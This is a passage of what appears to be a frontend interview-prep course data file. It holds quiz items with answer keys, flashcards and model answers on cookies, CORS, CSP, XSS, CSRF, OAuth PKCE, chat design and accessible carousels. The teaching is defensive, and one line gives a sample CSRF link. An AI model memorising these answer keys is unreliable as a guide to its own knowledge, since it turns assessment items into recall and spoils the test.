            '`fetch("https://bank.example/api/me", { credentials: "include" })`',
            '`<img src="https://bank.example/account/avatar.png">`',
            'The user clicking a normal link: `<a href="https://bank.example/account">`',
          ],
          answer: 3,
          explanation:
            '`Lax` sends cookies on cross-site requests only for **top-level navigations with safe methods**: clicking a link, or a GET form or `location` change. A cross-site POST form doesn\'t get the cookie. (Chrome\'s two-minute "Lax+POST" exception applies only to cookies set **without** a SameSite attribute, and this one sets it explicitly.) `fetch` and `<img>` are subresource requests, so no Lax cookie. The consequence: **GET handlers must never change state**, because a link to `https://bank.example/transfer?to=attacker` would carry the cookie.',
        },
        {
          id: 'cors-preflight-trigger',
          prompt: 'Your SPA on `https://app.example` calls `https://api.example`. Which request triggers a CORS **preflight**?',
          choices: [
            '`fetch(url)`: a GET with default headers',
            '`fetch(url, { method: "POST", body: new URLSearchParams({ q: "shoes" }) })`',
            '`fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) })`',
            '`fetch(url, { method: "HEAD" })`',
          ],
          answer: 2,
          explanation:
            '`application/json` is not a CORS-safelisted content type, so the browser first sends `OPTIONS` with `Access-Control-Request-Method: POST` and `Access-Control-Request-Headers: content-type`. A `URLSearchParams` body is sent as `application/x-www-form-urlencoded`, which is safelisted, so that\'s a simple request, as are plain GET and HEAD. Other preflight triggers: `PUT`/`PATCH`/`DELETE`, `Authorization` or any custom header (`X-CSRF-Token`), and streaming bodies. To reduce the cost: `Access-Control-Max-Age` caches preflights, and a same-origin API (reverse proxy or BFF) removes them entirely.',
        },
        {
          id: 'cors-credentials-wildcard',
          prompt:
            'The SPA calls `fetch("https://api.example/me", { credentials: "include" })`. The API responds with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`. What happens?',
          choices: [
            'It works: the wildcard allows every origin, including yours',
            'The browser refuses to expose the response: credentialed requests require the server to echo the exact origin (plus `Vary: Origin`), never `*`',
            'The browser silently drops the cookies and returns the response',
            'The server rejects the request because the two headers conflict',
          ],
          answer: 1,
          explanation:
            'The Fetch spec forbids `*` for credentialed CORS. The request is still sent with cookies, but the browser hides the response (a CORS error in the console). Fix it on the server: check `Origin` against an **allowlist**, echo the matching value, set `Access-Control-Allow-Credentials: true`, and add `Vary: Origin` so caches keep per-origin responses apart. Don\'t "fix" it by reflecting every `Origin`: that lets any website read your users\' data. Option D is wrong because servers don\'t validate their own CORS headers. Enforcement happens entirely in the browser.',
        },
        {
          id: 'strict-csp-what-runs',
          prompt: "With `Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'`, which script executes?",
          choices: [
            'A `<script src="https://cdn.example/lib.js">` tag injected through a stored XSS',
            'An inline handler: `<button onclick="track()">`',
            'A script element that your nonced bundle creates with `document.createElement("script")` and appends',
            'Clicking `<a href="javascript:track()">`',
          ],
          answer: 2,
          explanation:
            '`\'strict-dynamic\'` extends trust from a nonced script to scripts **it** creates through DOM APIs (non-parser-inserted), which is how code splitting and loaders keep working. Markup injected into the HTML is parser-inserted and has no nonce, so it\'s blocked, even from a host that "looks allowed", because host allowlists are ignored under `strict-dynamic`. Inline handlers and `javascript:` URLs would need `\'unsafe-inline\'`, which is ignored when a nonce is present. The residual risk to mention: if an attacker can control *which URL* your trusted loader fetches (a script gadget), strict-dynamic will trust it too.',
        },
        {
          id: 'httponly-xss-limit',
          prompt: 'Your session lives in an `HttpOnly; Secure; SameSite=Lax` cookie. An attacker finds a stored XSS in your app. What can they still do?',
          choices: [
            'Nothing: HttpOnly cookies make XSS harmless',
            'Read the session cookie via `document.cookie` and send it to their server',
            'Make authenticated requests from the victim\'s open page (e.g. `fetch("/api/transfer", { method: "POST" })`), but not exfiltrate the cookie itself',
            'Only perform GET requests, because SameSite=Lax blocks POSTs',
          ],
          answer: 2,
          explanation:
            'Injected script runs **in your origin**, so its same-origin requests carry the cookie automatically. HttpOnly only hides the cookie value from JavaScript. That still matters: the attacker can\'t take the session away and replay it later from another machine, so the attack is limited to while the page is open. SameSite is irrelevant because these requests are same-site. This is why XSS **prevention** (escaping, sanitization, CSP, Trusted Types) remains the primary control, and why "store tokens in HttpOnly cookies" is a blast-radius reduction, not an XSS fix.',
        },
        {
          id: 'pkce-purpose',
          prompt: 'In the OAuth Authorization Code flow for a single-page app, what specifically does **PKCE** protect against?',
          choices: [
            'XSS stealing the access token from memory',
            'An intercepted or injected authorization code being redeemed by someone who doesn\'t hold the original `code_verifier`',
            'CSRF against your own API endpoints',
            'Access tokens expiring too quickly',
          ],
          answer: 1,
          explanation:
            'PKCE binds the authorization code to the client instance that started the flow. Only the holder of the `code_verifier`, whose SHA-256 hash was sent as `code_challenge`, can exchange it, which replaces the client secret that a public client can\'t keep. It does nothing about XSS (code in your origin can simply use the session or tokens), API CSRF or token lifetimes. Related parameters: `state` protects the callback against CSRF and login CSRF, and the OIDC `nonce` binds the ID token to the login. RFC 9700 (the OAuth 2.0 Security BCP) requires PKCE for public clients and deprecates the implicit flow.',
        },
        {
          id: 'clickjacking-frame-ancestors',
          prompt: 'Which response header stops other sites from embedding your "Confirm payment" page in an invisible iframe?',
          choices: [
            "`Content-Security-Policy: frame-src 'none'`",
            "`Content-Security-Policy: frame-ancestors 'none'` (plus `X-Frame-Options: DENY` for very old browsers)",
            '`Access-Control-Allow-Origin: https://app.example`',
            '`Cross-Origin-Resource-Policy: same-origin`',
          ],
          answer: 1,
          explanation:
            '`frame-ancestors` controls **who may embed this page**. `frame-src` is the classic confusion: it controls what **this page** may embed. `Access-Control-Allow-Origin` governs reading responses with fetch/XHR, not framing. `Cross-Origin-Resource-Policy` stops other origins from loading the resource as a no-cors subresource (images, scripts) to mitigate Spectre-style leaks; it isn\'t the anti-framing control. `X-Frame-Options` is the legacy equivalent (`DENY`/`SAMEORIGIN`, no allowlist).',
        },
        {
          id: 'chat-idempotent-retry',
          prompt: 'A user sends a chat message. The POST times out, but the server actually stored it. The client retries. What prevents a duplicate message?',
          choices: [
            'Ordering messages by `createdAt`, so the duplicate collapses into the original',
            'A client-generated `clientId` sent with every attempt: the server de-duplicates on it (an idempotency key) and the client reconciles its optimistic message by the same id',
            'TCP guarantees that a request is delivered exactly once',
            'WebSockets guarantee exactly-once delivery, so switching transport fixes it',
          ],
          answer: 1,
          explanation:
            'A timeout is **ambiguous**: you can\'t know whether the request arrived. Retrying is the only way not to lose the message, and an idempotency key makes retrying safe, because the same key makes the server return the existing message instead of inserting another. Timestamps can\'t identify duplicates (a retry has a different time, and two different messages can share one). TCP guarantees ordered delivery *within one connection*, not across timeouts, retries and reconnects. WebSockets run on TCP and have the same problem after a reconnect. The other half is the client de-duplicating server events by `serverId`.',
        },
        {
          id: 'carousel-autoplay-a11y',
          prompt: 'An auto-rotating hero carousel advances every 5 seconds. Which approach follows the APG carousel pattern and WCAG?',
          choices: [
            'Set `aria-live="assertive"` on the slides so screen readers announce every new slide',
            'Provide a Stop/Start rotation control, pause on hover and when keyboard focus enters, and use `aria-live="off"` on the slide container while rotating (`"polite"` otherwise)',
            'Rotate faster (every 3 s) so users see every slide before they scroll away',
            'Hide the previous/next buttons from screen readers with `aria-hidden="true"` to reduce noise',
          ],
          answer: 1,
          explanation:
            'WCAG 2.2.2 (Pause, Stop, Hide) requires a way to pause content that moves automatically for more than 5 seconds. The APG carousel pattern adds the details: a rotation control first in tab order, rotation stops when focus enters (and on hover), and the slide container is `aria-live="off"` while rotating so users aren\'t interrupted, then `"polite"` so their own navigation is announced. `assertive` would interrupt constantly. Faster rotation makes things worse for everyone. And `aria-hidden` on focusable, operable controls is an accessibility failure in itself.',
        },
        {
          id: 'microfrontends-best-reason',
          prompt: 'Which is the strongest reason to adopt micro-frontends?',
          choices: [
            'To make the application load faster',
            'Several autonomous teams own distinct product areas and are blocked by a shared release train, so they need independent deployments',
            'The codebase has grown past a few hundred components',
            'So each team can pick a different framework for every feature',
          ],
          answer: 1,
          explanation:
            'Micro-frontends solve an **organisational** problem: independent deployment for autonomous teams. Performance usually gets *worse* (duplicated dependencies, runtime loading, more requests), so option A is a red flag. A large codebase is a modularisation problem: a monorepo with enforced boundaries and affected-only CI handles it more cheaply. Mixing frameworks is a cost, often presented as a benefit; it\'s justified mainly during incremental migrations (the strangler fig pattern).',
        },
      ],
    },
    {
      kind: 'exercise',
      id: 'secure-and-realtime-ui',
      title: 'Build it: URL safety, a chat store, a carousel and a sanitizer',
      minutes: 60,
      intro:
        'Interview conditions: set a timer for each exercise and talk through your threat model or state model out loud. Do the core exercises in order: `escapeHtml`/`isSafeUrl` (15 min), the chat reducer (20 min), then the carousel machine-coding round (25 min; autoplay is its stretch part). `sanitizeHtml` is the stretch exercise for when you finish early. Read every explanation: the follow-up questions are the interview.',
      exercises: [escapeHtmlSafeUrl, chatMessageReducer, accessibleImageCarousel, sanitizeHtmlAllowlist],
    },
    {
      kind: 'drill',
      id: 'speak-aloud',
      title: 'Speak-aloud drill',
      minutes: 15,
      intro:
        'Start with the concept questions: answer each out loud in about 90 seconds, then compare with the model answer. Then pick **one** system-design prompt and give a compressed 7-minute RADIO outline (requirements → architecture → data → interface → two deep dives) with a timer running. Save the other design prompts for a full 45-minute mock later in the course.',
    },
  ],
  flashcards: [
    { id: 'xss-types', front: 'The three types of **XSS**?', back: '**Stored** (payload saved, served to other users), **reflected** (echoed from the request), **DOM-based** (client JS moves a source like `location.hash` into a sink like `innerHTML`, never touching the server).' },
    { id: 'react-xss-coverage', front: 'What does React 19 protect against XSS, and what not?', back: 'Protects: escaped text and attribute values; `javascript:` URLs blocked in href/src/action. Not: `dangerouslySetInnerHTML`, other URL schemes, `innerHTML`/`location`/`eval` sinks, SSR state in `<script>`, third-party scripts.' },
    { id: 'ssr-state-escape', front: 'How do you safely embed JSON state in an SSR `<script>`?', back: 'Escape `<` as `\\u003c` (or use a serializer like `serialize-javascript`/`devalue`). The HTML parser ends the script at `</script>` regardless of JS string quoting.' },
    { id: 'strict-csp', front: 'A strict CSP in one line?', back: "`script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`, with a fresh nonce per response. Trusted scripts may load others; injected scripts, inline handlers and `javascript:` URLs are blocked." },
    { id: 'trusted-types', front: 'What do **Trusted Types** do?', back: "`require-trusted-types-for 'script'` makes DOM XSS sinks (`innerHTML`, `script.src`, `eval`…) reject strings. Only values from named, reviewed policies (e.g. wrapping DOMPurify) are accepted." },
    { id: 'samesite-values', front: '`SameSite` Strict vs Lax vs None?', back: '**Strict:** never sent cross-site. **Lax:** cross-site only on top-level safe-method navigations (link clicks). **None:** always; requires `Secure`. Chrome treats a missing attribute as Lax. Set it explicitly.' },
    { id: 'samesite-is-site', front: 'Does SameSite protect `app.example.com` from `blog.example.com`?', back: 'No. Same registrable domain = **same site**, so a compromised subdomain can still forge requests. Add CSRF tokens or `Origin`/`Sec-Fetch-Site` checks.' },
    { id: 'csrf-vs-xss', front: 'CSRF vs XSS in one line each?', back: '**CSRF:** blind requests riding ambient cookies; can\'t read responses. **XSS:** attacker code running in your origin; can do anything, including defeating every CSRF defence.' },
    { id: 'cors-purpose', front: 'Who does **CORS** protect?', back: 'The **user**: it stops other sites\' pages from reading responses meant for them. It doesn\'t protect your server (curl ignores it) and it isn\'t a CSRF defence.' },
    { id: 'cors-preflight', front: 'What triggers a CORS **preflight**?', back: 'Non-simple requests: methods other than GET/HEAD/POST, non-safelisted headers (`Authorization`, custom headers), or a Content-Type other than form-urlencoded / multipart / `text/plain` (e.g. `application/json`).' },
    { id: 'cors-credentials', front: 'Credentialed CORS (cookies) requires…', back: "`credentials: 'include'` on the client; `Access-Control-Allow-Credentials: true` plus an **exact**, allow-listed `Access-Control-Allow-Origin` (never `*`) and `Vary: Origin` on the server." },
    { id: 'frame-ancestors', front: 'Clickjacking defence?', back: "`Content-Security-Policy: frame-ancestors 'none'` (or an allowlist), plus `X-Frame-Options: DENY` for legacy browsers. Not `frame-src`, which controls what *you* embed." },
    { id: 'httponly-limits', front: 'What does `HttpOnly` buy you against XSS?', back: 'Injected JS can\'t read or exfiltrate the cookie, so the session can\'t be replayed elsewhere. It **can** still make authenticated requests from the open page.' },
    { id: 'pkce', front: 'What is **PKCE**?', back: 'Proof Key for Code Exchange: send `SHA-256(code_verifier)` as `code_challenge` when authorizing, then the verifier when redeeming the code, so an intercepted code is useless. Required for public clients (RFC 9700).' },
    { id: 'implicit-deprecated', front: 'Why is the OAuth **implicit flow** deprecated?', back: 'Tokens come back in the URL fragment (leaked via history, referrers, extensions), with no sender binding, no refresh tokens and a token-injection risk. Use Authorization Code + PKCE, ideally behind a BFF.' },
    { id: 'bff-pattern', front: 'What is the **BFF** pattern for auth?', back: 'A same-site Backend-for-Frontend acts as a confidential OAuth client, keeps tokens server-side, proxies API calls, and gives the browser only an HttpOnly session cookie.' },
    { id: 'sri', front: 'What is **Subresource Integrity**?', back: '`integrity="sha384-…"` on `<script>`/`<link>`: the browser refuses the file if its hash differs. Needs immutable, versioned URLs and `crossorigin="anonymous"` for cross-origin files.' },
    { id: 'chat-no-dupes', front: 'Chat: how do you avoid duplicate and lost messages?', back: 'A `clientId` idempotency key (the server dedupes retries), client dedupe of server events by `serverId`, ordering by server `seq`, and resuming from the last seq after reconnecting.' },
    { id: 'ot-vs-crdt', front: 'OT vs CRDT?', back: '**OT** transforms concurrent operations against each other, usually with a central server ordering them. **CRDTs** make merges commutative, associative and idempotent so replicas converge in any order: offline/P2P friendly, with metadata overhead.' },
    { id: 'carousel-aria-live', front: 'Carousel `aria-live` strategy?', back: '`"off"` while auto-rotating, `"polite"` otherwise: user-initiated slide changes are announced, automatic rotation doesn\'t interrupt. Plus a Stop/Start control (WCAG 2.2.2).' },
  ],
  interviewQuestions: [
    {
      id: 'design-chat-app',
      kind: 'system-design',
      level: 'senior',
      minutes: 45,
      question: 'Design the frontend of a real-time chat application like WhatsApp Web or Slack. Focus on the client.',
      answer: `**Requirements (clarify first):** 1:1 and group chats, a conversation list with unread counts, real-time send/receive, message states (sending → sent → delivered → read), history scroll-back, typing indicators. Non-functional: sending feels instant, works on flaky networks, no lost or duplicated messages, long histories, multiple tabs, accessible. Out of scope: E2E encryption internals, calls, search.

**Architecture:** the UI (ConversationList; ConversationView with a virtualized MessageList and a Composer) reads from a **normalized client store**. A single **sync layer** owns the WebSocket and turns events into store actions; a REST client loads history; an **IndexedDB outbox** persists unsent messages. WebSocket because traffic is bidirectional and chatty; REST for history because it's cacheable and paginated.

**Data model:** \`Message { clientId, serverId?, seq?, conversationId, authorId, body, createdAt, status }\`; \`Conversation { id, participants, unreadCount, lastReadSeq per user, history cursor }\`, normalized by id with ordered ids per conversation.

**Interface:** \`GET /conversations/:id/messages?before=seq&limit=50\`; \`POST …/messages { clientId, body }\`, idempotent on \`clientId\`. WS events: \`message.new\`, \`message.ack { clientId, serverId, seq }\`, \`receipt { upToSeq }\`, \`typing\`, \`ping/pong\`; the client sends \`resume { lastSeq }\` after reconnecting.

**Deep dives:**
1. *Reliability.* Optimistic insert keyed by a UUID \`clientId\`; the ack attaches \`serverId\`/\`seq\`; order by **server seq**, never client clocks; dedupe incoming events by \`serverId\`; retries reuse the \`clientId\` so the server dedupes. Echo-before-ack and timeout-after-ack are reconciled by id.
2. *Connection lifecycle.* An app-level heartbeat detects half-open sockets; reconnect with exponential backoff plus jitter, and immediately on \`online\`/visibility; after reconnecting, send the last seq to fill gaps and flush the outbox in order. One tab owns the socket (a Web Locks leader plus BroadcastChannel).
3. *Rendering.* Cursor-based reverse infinite scroll that preserves scroll position on prepend; virtualization with measured heights; stick to the bottom only if already there; batch bursts per frame.
4. *A11y and security.* \`role="log"\`, a labelled composer, keyboard shortcuts. Messages rendered as text, links URL-validated, markdown sanitized. WebSocket auth via cookie plus an Origin check, or a short-lived ticket.

**Trade-offs to call out:** WebSocket statefulness vs SSE simplicity; read receipts as watermarks vs per-message flags; virtualization vs find-in-page and screen-reader coverage.`,
      followUps: [
        'How do you detect and fill gaps after a reconnect?',
        'How would you implement read receipts efficiently in a 500-person group?',
        'How do you share one socket across several tabs?',
        'How do you keep the scroll position stable when loading older messages?',
        'What changes if you need end-to-end encryption?',
      ],
    },
    {
      id: 'design-image-carousel',
      kind: 'system-design',
      level: 'core',
      minutes: 30,
      question: 'Design a reusable image carousel component for a design system. What does its API look like, and how do you make it fast and accessible?',
      answer: `**Requirements:** one or more slides per view, prev/next, indicators, swipe, keyboard, optional autoplay, captions, responsive images. It must be accessible, smooth (60 fps), free of layout shift, and reusable by many teams. Clarify: loop or bounded? Thumbnails? A full-screen lightbox?

**Architecture:** a headless \`useCarousel\` hook (index, \`go/next/prev\`, autoplay state, prop getters) plus a styled \`Carousel\` built from compound parts (\`Carousel.Viewport\`, \`Carousel.Slide\`, \`Carousel.Prev/Next\`, \`Carousel.Dots\`, \`Carousel.RotationControl\`) that share state through context. The track moves with \`transform: translateX\`, or uses CSS scroll snap for native physics.

**Data/state:** \`index\`, \`isPlaying\` (the user's choice), temporary pauses (\`hovered\`, \`focusWithin\`), the drag offset. Slides: \`{ id, src, srcSet, alt, width, height, caption }\`.

**Interface:** \`index\`/\`defaultIndex\`/\`onIndexChange\` (controlled and uncontrolled), \`loop\`, \`slidesPerView\`, \`autoplay={{ intervalMs }}\`, a required \`aria-label\` (enforced by the types), and \`renderSlide\` for custom content, all named consistently with the rest of the system.

**Optimizations:**
- *Images:* the first slide is eager with \`fetchpriority="high"\` (it's often the LCP element); neighbours are preloaded and the rest lazy; \`srcset\`/\`sizes\`; explicit dimensions so there's no CLS.
- *Interaction:* Pointer Events with capture, a distance or velocity threshold, \`touch-action: pan-y\`; animate only \`transform\`; honour \`prefers-reduced-motion\`.
- *Accessibility (APG):* a region with \`aria-roledescription="carousel"\` and a label; slides as \`group\`s labelled "n of total"; real buttons with names; inactive slides \`hidden\`/\`inert\`; the rotation control first; pause on hover and focus; \`aria-live\` off while rotating and polite otherwise (WCAG 2.2.2).
- *Quality:* Storybook stories per state, Testing Library tests by role, visual regression tests.

**Trade-off to mention:** scroll snap gives native momentum and trackpad behaviour but makes index syncing and looping harder; a transform track is fully controllable, but you reimplement the physics.`,
      followUps: [
        'How would you support infinite looping without a visible jump?',
        'How would you test autoplay deterministically?',
        'How do you support both controlled and uncontrolled usage?',
        'What changes for a full-screen lightbox (focus trap, Escape, restoring focus)?',
      ],
    },
    {
      id: 'design-component-library',
      kind: 'system-design',
      level: 'senior',
      minutes: 40,
      question: 'You are asked to build a design system / component library used by 15 product teams. How do you approach it?',
      answer: `**Requirements:** who consumes it (React only? native too? SSR?) and what the goals are: consistency, delivery speed, accessibility by default, theming (brands, dark mode), stability. Non-functional: tree-shakable, SSR- and CSP-friendly, documented, versioned. Success means adoption.

**Architecture, in layers:**
1. **Design tokens**: primitive → semantic → component, in a platform-agnostic format, generated (e.g. with Style Dictionary) into CSS custom properties and TS constants, and kept in sync with Figma.
2. **Foundations**: typography, spacing, colour, motion, icons, layout primitives.
3. **Headless behaviour**: built on (or modelled after) React Aria or Radix, handling focus management, keyboard support and ARIA per APG pattern.
4. **Styled components and patterns.**

Packages live in a monorepo (\`@acme/tokens\`, \`@acme/icons\`, \`@acme/react\`) and use zero-runtime styling so they work with streaming SSR, Server Components and a strict CSP.

**Theming:** semantic tokens as CSS variables switched by \`[data-theme]\`, with nested themes; support \`prefers-color-scheme\`, \`forced-colors\` and reduced motion.

**API principles:** consistent naming (\`variant\`, \`size\`, \`open/onOpenChange\`, \`value/defaultValue/onValueChange\`); controlled and uncontrolled modes; composition (compound components, \`asChild\`) over boolean props; native prop pass-through and refs; typed variant unions; accessible names that the types require.

**Accessibility:** every component meets its APG pattern; token pairs are contrast-checked; focus is visible; targets are at least 24 px. Run axe in CI and test complex widgets manually with screen readers.

**Delivery:** semver with Changesets; deprecation warnings first, removal in the next major; codemods; ESM with \`sideEffects\` and React as a peer dependency; visual regression and interaction tests driven by Storybook stories.

**Docs and adoption:** Storybook as the source of truth (props tables generated from TS, do/don't guidance, a11y notes), migration guides, office hours, a federated contribution model with RFCs, lint rules (no raw colours), and **metrics**: scan imports to track adoption and find where teams detach.

**Trade-offs:** flexibility vs consistency (escape hatches like \`className\` invite drift); building on a headless library vs owning everything; one package vs per-component packages (simple versioning vs independent upgrades).`,
      followUps: [
        'How do you roll out a breaking change to Button across 40 apps?',
        'Runtime CSS-in-JS or not, and why?',
        'How do you measure the design system\'s success?',
        'A team needs a component you don\'t have yet. What happens?',
        'How would you theme for a white-label customer at runtime?',
      ],
    },
    {
      id: 'xss-in-react',
      kind: 'concept',
      level: 'core',
      minutes: 3,
      question: 'What is XSS, and how do you prevent it in a React application?',
      answer: `**One-liner:** XSS is when an attacker gets their JavaScript to run in your origin, so it can do anything the user can: read data, call APIs with their session, steal tokens.

**Three types:** stored (payload saved and shown to others), reflected (echoed from the request), and DOM-based (client code moves a source like \`location.hash\` into a sink like \`innerHTML\`).

**What React gives me:** text and attribute values are escaped, handlers are functions rather than strings, and React 19 blocks \`javascript:\` URLs in \`href\`/\`src\`/\`action\`.

**What's still on me:**
- \`dangerouslySetInnerHTML\`: sanitize with DOMPurify right before rendering, inside one reviewed component.
- URLs: allowlist schemes (http, https, mailto, relative) for user links and redirects, including \`window.location\` and \`window.open\`.
- Refs and \`innerHTML\`, third-party widgets, spreading untrusted props.
- SSR state inside \`<script>\`: escape \`<\`.
- Third-party scripts: as few as possible, with SRI, and kept off sensitive pages.

**Defence in depth:** a nonce-based strict CSP with \`strict-dynamic\`, \`object-src 'none'\` and \`base-uri 'none'\`, rolled out in report-only mode first, plus Trusted Types to lock down DOM sinks; and HttpOnly cookies so a successful XSS can't exfiltrate the session.

**To close:** escaping is contextual (HTML, attribute, URL, JS and CSS contexts all differ), so I rely on the framework's escaping and treat every escape hatch as a reviewed exception.`,
      followUps: [
        'Does React 19 fully protect `<a href={url}>`?',
        'Why is a regex-based sanitizer a bad idea?',
        'What is a DOM-based XSS source and sink? Give examples.',
        'How does `strict-dynamic` work?',
      ],
    },
    {
      id: 'csrf-vs-xss-explained',
      kind: 'concept',
      level: 'core',
      minutes: 2,
      question: 'What is the difference between CSRF and XSS, and how do you defend against each?',
      answer: `**One-liner:** XSS runs the attacker's code *inside* your origin; CSRF makes the victim's browser *send* a request to your origin from somewhere else, relying on cookies being attached automatically.

- **Capabilities:** XSS can read and write anything the page can. CSRF is blind: it can trigger state changes but can't read responses, because of the same-origin policy.
- **Root cause:** XSS is untrusted data reaching an executable sink; CSRF is ambient credentials.

**CSRF defences:** set \`SameSite=Lax\` or \`Strict\` explicitly on session cookies (remembering that it's site-based, so subdomains count as same-site); never change state on GET; use CSRF tokens (synchronizer or signed double-submit), or require a custom header or JSON content type, which forces a preflight; verify \`Origin\`/\`Sec-Fetch-Site\` on the server. Bearer tokens sent in a header are naturally immune.

**XSS defences:** contextual escaping (React does it), HTML sanitization (DOMPurify), URL allowlists, a strict CSP plus Trusted Types.

**The key relationship:** XSS defeats every CSRF defence. Injected script runs same-origin, can read the CSRF token and sends requests with the cookies attached. So CSRF protection without XSS prevention is incomplete, and HttpOnly doesn't stop requests made from the compromised page.`,
      followUps: ['Does `SameSite=Lax` fully solve CSRF?', 'Why does requiring `Content-Type: application/json` help against CSRF?', 'What is login CSRF and how do you prevent it?'],
    },
    {
      id: 'cors-explained',
      kind: 'concept',
      level: 'core',
      minutes: 2,
      question: 'Explain CORS. Why do we get CORS errors, and how should they be fixed?',
      answer: `**One-liner:** the same-origin policy stops a page from *reading* responses from other origins; CORS is the header-based protocol a server uses to opt in to letting specific origins read them.

**Why it exists:** without it, any website could use your browser, with your cookies and your network position, to read your bank or intranet data. So CORS protects the **user's data**. It's enforced by the browser and does nothing against curl or a server-side attacker.

**Mechanics:** simple requests (GET/HEAD/POST with safelisted headers and a form or text content type) are sent directly; the browser then checks \`Access-Control-Allow-Origin\` and hides the response if it doesn't match. Everything else (JSON bodies, \`Authorization\` or custom headers, PUT/DELETE) triggers an \`OPTIONS\` preflight with \`Access-Control-Request-Method/Headers\`, and the real request only follows if it's allowed. \`Access-Control-Max-Age\` caches preflights.

**Credentials:** with \`credentials: 'include'\` the server must return \`Access-Control-Allow-Credentials: true\` and the exact origin (never \`*\`), plus \`Vary: Origin\`.

**Fixing errors properly:** on the server, allowlist known origins (never reflect an arbitrary \`Origin\` with credentials, never allow \`null\`), or avoid CORS entirely by serving the API from the same origin through a reverse proxy or BFF (Vite's dev proxy locally). Disabling browser security or using \`no-cors\` doesn't fix anything; \`no-cors\` just gives you an opaque response.

**Gotcha:** CORS isn't CSRF protection. Simple cross-origin requests still reach the server and change things.`,
      followUps: ['Which requests trigger a preflight?', 'Why can\'t you use `*` with credentials?', 'Is a POST that fails CORS still executed on the server?'],
    },
    {
      id: 'auth-token-storage',
      kind: 'concept',
      level: 'senior',
      minutes: 3,
      question: 'Where should a single-page app store authentication tokens? Defend your choice.',
      answer: `**One-liner:** prefer an \`HttpOnly; Secure; SameSite\` cookie, ideally a session cookie from a backend-for-frontend that keeps the OAuth tokens server-side, over \`localStorage\`.

**Reasoning by threat:**
- **localStorage/sessionStorage:** readable by any script in the origin, so one XSS or a compromised dependency can exfiltrate a token that the attacker replays from their own machine until it expires.
- **In memory:** not persisted, gone on reload, but still readable by injected script while the page is open, and it needs a silent-refresh mechanism.
- **HttpOnly cookie:** JS can't read it, so it can't be exfiltrated. It's sent automatically, though, so I add CSRF defences: SameSite plus a CSRF token or Origin/Fetch Metadata checks. The \`__Host-\` prefix locks it to the host.
- **BFF:** the backend is a confidential OAuth client and tokens never reach the browser. The IETF guidance for browser-based apps ranks this the most secure option.

**The honest nuance:** HttpOnly doesn't make XSS harmless. Injected code can still make authenticated requests from the victim's page. What HttpOnly does is limit the attack to the page's lifetime and prevent credential theft. XSS prevention (escaping, sanitization, CSP) remains the primary control.

**Practical defaults:** short-lived access tokens, refresh-token rotation with reuse detection (or DPoP), logout that revokes on the server, and a same-site API host to keep cookies simple.`,
      followUps: ['If XSS can make requests anyway, why does HttpOnly matter?', 'How do you call a third-party API that requires a bearer token?', 'What does the `__Host-` prefix guarantee?'],
    },
    {
      id: 'csp-explained',
      kind: 'concept',
      level: 'senior',
      minutes: 3,
      question: 'What is Content Security Policy, and how would you introduce one to an existing React app?',
      answer: `**One-liner:** CSP is a response header that tells the browser which scripts and other resources may load and execute, so injected script fails to run even when an XSS bug exists. It's a second line of defence, not a fix.

**What I'd deploy, a strict CSP:** \`script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'\`, plus \`https:\` and \`'unsafe-inline'\` fallbacks that modern browsers ignore. Every response gets a fresh, unguessable nonce stamped on our script tags, and \`strict-dynamic\` lets those scripts load chunks. Inline handlers and \`javascript:\` URLs are blocked. I'd avoid host allowlists: research showed most are bypassable through JSONP endpoints or script gadgets on allowed hosts. For static or CDN-cached HTML I'd use hashes instead of nonces.

**Rollout:**
1. Inventory scripts (analytics, tag manager, chat widget) and inline code.
2. Ship \`Content-Security-Policy-Report-Only\` with \`report-to\`, collect violations for a couple of weeks and fix them: nonces via the framework, inline handlers moved into code, third parties dropped or re-hosted.
3. Enforce, keep reporting on, and alert on spikes.
4. Add \`require-trusted-types-for 'script'\` so DOM sinks only accept values from a reviewed policy, e.g. one that wraps DOMPurify.

**React-specific notes:** React attaches handlers in JS, so inline handlers aren't a problem; SSR frameworks support nonces; runtime CSS-in-JS needs \`style-src\` nonces too. \`frame-ancestors\` handles clickjacking, and a \`<meta>\` CSP can't do \`frame-ancestors\` or reporting.`,
      followUps: ['Why are allowlist-based CSPs considered weak?', 'What does `strict-dynamic` do?', 'How do nonces interact with CDN caching?', 'What are Trusted Types?'],
    },
    {
      id: 'oauth-pkce-spa',
      kind: 'concept',
      level: 'senior',
      minutes: 3,
      question: 'How should a single-page application implement login with OAuth 2.0 / OpenID Connect? Why PKCE, and why not the implicit flow?',
      answer: `**One-liner:** use the Authorization Code flow with PKCE through a certified library, or better, behind a backend-for-frontend. The implicit flow is deprecated by the OAuth 2.0 Security BCP (RFC 9700).

**Flow:** the SPA creates a random \`code_verifier\` and redirects to \`/authorize\` with its SHA-256 hash as \`code_challenge\` (method S256), plus \`state\` and an OIDC \`nonce\`. The user authenticates at the authorization server, which redirects back with a short-lived \`code\`. The SPA checks \`state\`, then exchanges \`code + code_verifier\` at the CORS-enabled \`/token\` endpoint for an access token, an ID token and a rotating refresh token.

**Why PKCE:** an SPA is a public client with no secret. PKCE binds the code to the instance that started the flow, so a code intercepted from history, logs or a malicious redirect handler, or injected into another session, is useless without the verifier.

**Why not implicit:** it returned the access token in the URL fragment, exposed to history, extensions, referrer leaks and token injection, with no refresh tokens and no sender binding. It only existed because SPAs couldn't call the token endpoint cross-origin before CORS.

**Other details:** \`state\` prevents login CSRF; \`nonce\` binds the ID token; ID tokens are for the client and access tokens for APIs; redirect URIs must match exactly; tokens are short-lived, with refresh-token rotation or DPoP.

**Architecture choice:** with a BFF, the backend is a confidential client that keeps the tokens server-side and issues an HttpOnly session cookie, so there are no tokens in JavaScript at all. I'd choose it for anything handling sensitive data.`,
      followUps: ['What is the difference between `state`, `nonce` and PKCE?', 'ID token vs access token: who consumes each?', 'Where would you keep the refresh token in a browser-only SPA?'],
    },
    {
      id: 'microfrontends-tradeoffs',
      kind: 'concept',
      level: 'senior',
      minutes: 3,
      question: 'What are micro-frontends? When would you recommend them, and when not?',
      answer: `**One-liner:** micro-frontends split one product's UI into parts that different teams build, test and deploy independently, composed at build time, on the server or in the browser.

